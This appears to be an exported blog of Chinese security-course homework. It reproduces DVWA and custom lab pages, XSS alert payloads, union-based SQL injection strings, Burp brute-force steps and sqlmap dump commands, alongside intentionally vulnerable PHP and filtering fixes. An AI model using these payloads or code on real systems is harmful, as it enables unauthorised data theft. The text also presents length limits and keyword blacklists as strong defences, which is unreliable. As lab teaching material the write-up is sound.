&lt;title&gt;xss&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;h6&gt;please input your name!&lt;&#x2F;h6&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php function SafeFilter (&amp;$arr) &#123; $ra&#x3D;Array(&#39;&#x2F;([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39; ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39; ,&#39;&#x2F;base&#x2F;&#39;,&#39;&#x2F;onload&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;,&#39;&#x2F;onchange&#x2F;&#39;,&#39;&#x2F;onsubmit&#x2F;&#39;,&#39;&#x2F;onreset&#x2F;&#39;,&#39;&#x2F;onselect&#x2F;&#39;,&#39;&#x2F;onblur&#x2F;&#39;,&#39;&#x2F;onfocus&#x2F;&#39;, &#39;&#x2F;onabort&#x2F;&#39;,&#39;&#x2F;onkeydown&#x2F;&#39;,&#39;&#x2F;onkeypress&#x2F;&#39;,&#39;&#x2F;onkeyup&#x2F;&#39;,&#39;&#x2F;onclick&#x2F;&#39;,&#39;&#x2F;ondblclick&#x2F;&#39;,&#39;&#x2F;onmousedown&#x2F;&#39;,&#39;&#x2F;onmousemove&#x2F;&#39; ,&#39;&#x2F;onmouseout&#x2F;&#39;,&#39;&#x2F;onmouseover&#x2F;&#39;,&#39;&#x2F;onmouseup&#x2F;&#39;,&#39;&#x2F;onunload&#x2F;&#39;); if (is_array($arr)) &#123; foreach ($arr as $key &#x3D;&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#x2F;&#x2F;不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value &#x3D; addslashes($value); &#x2F;&#x2F;给单引号（&#39;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value &#x3D; preg_replace($ra,&#39;&#39;,$value); &#x2F;&#x2F;删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] &#x3D; htmlentities(strip_tags($value)); &#x2F;&#x2F;去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; &#x2F;&#x2F;php防注入和XSS攻击通用过滤 $_POST &amp;&amp; SafeFilter($_POST); if (isset($_POST[&#39;username&#39;])) &#123; $s&#x3D;$_POST[&#39;username&#39;]; echo $s; &#125; ?&gt; &lt;&#x2F;center&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 网页源码十分简单，就是用户输入所要查询的username，之后将其输入的内容打印出来。 起初并没有对用户的输入进行处理，直接执行了echo，造成了xss漏洞的出现。 2.攻击效果在输入栏中输入以下 &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; &lt;img src=1 onerror=alert(/xsss/)&gt; 3.漏洞修复修复漏洞只需要对用户的输入内容进行检测和过滤，并将一些可能造成攻击的特殊字符进行转义，让其不起到原本的作用。 过滤函数如下 function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27; ,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27; ,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;, &#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27; ,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; 各个函数功能如下： magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 在magic_quotes_gpc=On的情况下，如果输入的数据有 单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。 addslashes函数 htmlentities() 函数把字符转换为 HTML 实体。 sql注入环境搭建与攻击网页源码，最常见的登录页面，其中没有对用户名和密码进行过滤，就将其带入sql语句中查询造成了sql注入的出现。 login.php源码 &lt;!DOCTYPE html&gt; &lt;html &gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt; &lt;title&gt;Sqli&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;body&gt; &lt;div class&#x3D;&quot;limiter&quot;&gt; &lt;div class&#x3D;&quot;container-login100&quot;&gt; &lt;div class&#x3D;&quot;wrap-login100 p-b-160 p-t-50&quot;&gt; &lt;form class&#x3D;&quot;login100-form validate-form&quot; action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;span class&#x3D;&quot;login100-form-title p-b-43&quot;&gt; Account Login &lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;wrap-input100 rs1 validate-input&quot; data-validate&#x3D;&quot;Username is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Username&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;wrap-input100 rs2 validate-input&quot; data-validate&#x3D;&quot;Password is required&quot;&gt; &lt;input class&#x3D;&quot;input100&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;span class&#x3D;&quot;label-input100&quot;&gt;Password&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;container-login100-form-btn&quot;&gt; &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;login100-form-btn&quot;&gt; Sign in &lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; check.php源码 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success&quot;; &#125; else &#123; echo &quot;username or password error&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 逻辑很简单，在login.php页面提交用户名和密码，将username和password发送到check.php页面连接数据库检查用户是否合法，用户名和密码都正确则，打印出用户名和密码。 在数据库建立了一张users和flag表，便于注入。 表中的内容如下 1.漏洞利用直接使用万能密码登陆 username:1&#x27; or 1=1 # username:111 结果打印出了第一个用户的用户名和密码 这个结果也说名了是字符型注入，接下来利用改注入点获取flag 判断表有几列1&#x27; order by 3# 页面显示正常，而改为4的时候网页出现报错，说明了只有三列 1&#x27; order by 4# 判断显示位&#x27; union select 1,database(),3# 说明有两个显示位，选择其中一个位置进行注入即可。 获取表名&#x27; union select 1,group_concat(table_name),3 from information_schema.TABLES where TABLE_SCHEMA=database()# 获取列名&#x27; union select 1,group_concat(COLUMN_name),3 from information_schema.COLUMNS where TABLE_NAME=&#x27;flag&#x27;# （fl4g是dvwa实验中建立没有删除，所以也显示出来了） 获取flag&#x27; union select 1,group_concat(flag),3 from flag# 2.漏洞防御方法一：最简单的方法对用户名和密码的长度限制，一般用户名的长度不超过十五个字符，而密码的长度一般不超过16个字符长度，所以对用户输入限制长度是最有效的方法之一。因为一般的注入语句都是超过十六个字符的，想要在十六个字符之内构造出有效的注入语句是一件很难的事情。 代码实现 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) &#123; echo &quot;It is too long.&quot;; &#125; else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 方法二对用户输入进行检测和过滤，将其输入的可能产生恶意行为的代码删除或者转义，使其失去原来的功能。 代码实现 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; //echo &quot;select * from admin where passward=&#x27;$pwd&#x27; and name=&#x27;$uname&#x27;&lt;br/&gt;&quot;; //echo &quot;&lt;hr&gt;&quot;; function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; $pwd=inject_check($pwd); $uname = inject_check($uname); $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; $result = $mysqli-&gt;query(&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;$pwd&#x27;&quot;); echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; // else if($row=mysqli_fetch_row($result)) &#123; printf (&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$row[1],$row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;login success.&quot;; &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // echo &quot;&lt;/TABLE&gt;&quot;; // echo &quot;&lt;/div&gt;&quot;; $mysqli-&gt;close(); $result-&gt;close(); ?&gt; 过滤函数如下，其中将一般注入需要用到的函数和符号都过滤了。 function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); if ($check) &#123; echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; exit(); &#125;else&#123; return $Sql_Str; &#125; &#125; 方法三使用预编译语句 代码如下 &lt;?php $pwd=$_POST[&#x27;password&#x27;]; $uname=$_POST[&#x27;username&#x27;]; // function inject_check($Sql_Str) &#123;//自动过滤Sql的注入语句。 // $check=preg_match(&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\\&#x27;|\\\\*|\\*|\\.\\.\\/|\\.\\/|union|and|ascii|substring|sleep/i&#x27;,$Sql_Str); // if ($check) &#123; // echo &#x27;&lt;script language=&quot;JavaScript&quot;&gt;alert(&quot;hacker&quot;);&lt;/script&gt;&#x27;; // exit(); // &#125;else&#123; // return $Sql_Str; // &#125; // &#125; // $pwd=inject_check($pwd); // $uname = inject_check($uname); // $mysqli = new mysqli(&#x27;localhost&#x27;,&#x27;root&#x27;,&#x27;root&#x27;,&#x27;test&#x27;); // 数据库服务器的主机名这里使用的本地主机，密码，使用的数据库名 if(mysqli_connect_errno())&#123; printf(&quot;fail:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); &#125; echo &quot;&lt;TABLE border=1,width=400&gt;&quot;; echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;; $result = $mysqli-&gt;prepare(&quot;select * from users where username=? and password=?&quot;); $result-&gt;bind_param(&#x27;ss&#x27;,$uname,$pwd); $result-&gt;execute(); $result-&gt;store_result(); $result-&gt;bind_result($id,$un,$pd); //将查询到的变量绑定到三个自定义的变量中，输出时直接输出这三个变量即可。 if($result-&gt;fetch()) &#123; printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;,$un,$pd); &#125; else &#123; echo &quot;username or password error.&quot;; &#125; // if(strlen($pwd)&gt;=16||strlen($uname)&gt;=15) // &#123; // echo &quot;It is too long.&quot;; // &#125; echo &quot;&lt;/TABLE&gt;&quot;; echo &quot;&lt;/div&gt;&quot;; $result-&gt;close(); $mysqli-&gt;close(); ?&gt; 应用预编译语句后，再次输入注入语句后就不再起到注入作用，只是将其当成正常的查询过程，返回相应的结果。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"xss","slug":"xss","permalink":"https://sunzhengyu99.github.io/tags/xss/"}]},{"title":"网安作业2","date":"2020-11-12T11:09:43.000Z","path":"2020/11/12/网安作业2/","text":"DVWA实验一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表 Brute Force使用工具 ：bp 使用材料：密码字典 bp的四种爆破攻击类型第一种：Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。 第二种：Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中 第三种：Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量 第四种：Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。 low1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password 2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码 3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。 medium&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; 与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。 1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。 2.加载密码字典进行爆破。 3.根据响应包的长度确定正确密码。 high&lt;?php if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块 1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量 2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。 3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always 4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。 5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。 SQL Injectionlow&lt;?php if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;注入点就在这句代码中 手工注入1.判断注入类型1 or 1=1 # 1&#x27; or 1=1 # 可知是字符型注入 2.判断多少字段数1&#x27; order by 1,2,3 # 报错 1&#x27; order by 1,2 # 显示正常，说明只有2个字段 3.确认显示顺序 两个位置都可以使用 4.union查询1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; # 1&#x27; union select 1,group_concat(fl4g) from flag # sqlmap注入python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch --dbs python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag --columns python2 sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot; --batch -D dvwa -T flag -C fl4g --dump medium与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容 手工注入经过测试是数字型注入，很简单的判断就不截图了 1.判断列数id=1 order by 1,2#&amp;Submit=Submit 此时页面正常 id=1 order by 1,2,3#&amp;Submit=Submit 此时页面报错 Unknown column &#39;3&#39; in &#39;order clause&#39; 所以可知为两列，之后的操作与low级别的一样 2.union查询爆数据库名 id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;Submit=Submit 爆列名 id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #&amp;Submit=Submit 读取flag id=-1 union select 1,group_concat(fl4g) from flag #&amp;Submit=Submit 这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 &#39;被 \\转义了，可以使用十六进制绕过 分析源码 &lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125; // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt; mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 所以导致了单引号被转义的结果 sqlmap注入因为是post注入，所以需要抓取数据包保存下来。 如图，可以将其保存在sqlmap.py的路径下 注入过程python2 .\\sqlmap.py -r .\\a.txt --batch --dbs python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa --tables python2 .\\sqlmap.py -r .\\a.txt --batch -D dvwa -T flag --columns python2 